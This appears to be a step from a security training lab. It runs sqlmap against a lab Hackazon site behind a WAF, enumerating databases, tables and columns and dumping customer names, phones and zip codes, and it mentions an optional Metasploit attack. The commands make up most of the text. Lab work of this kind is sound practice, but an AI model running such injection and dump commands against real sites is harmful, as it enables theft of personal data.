SQLMap
======================

   a. (Kali) Repeat SQL Injection from previous lab

      i.   # cd /root/Agility/sqlmap

      ii.  # sqlmap -u
           http://hackazon-waf.f5agility.com/product/view?id=51 -- dbs

      iii. # sqlmap -u
           http://hackazon-waf.f5agility.com/product/view?id=51 -D
           hackazon --tables

      iv.  # sqlmap -u
           http://hackazon-waf.f5agility.com/product/view?id=51 -D
           hackazon -T tbl\_customer\_address --columns

      v.   # sqlmap -u
           http://hackazon-waf.f5agility.com/product/view?id=51 -D
           hackazon -T tbl\_customer\_address -C full\_name,phone,zip
           --dump

   b. Observe impact

      i. Is site available?

4. (Optional) Attack via Metasploit

-  Repeat steps in previous Metasploit lab.

-  Don’t forget to update the URL for WAF!
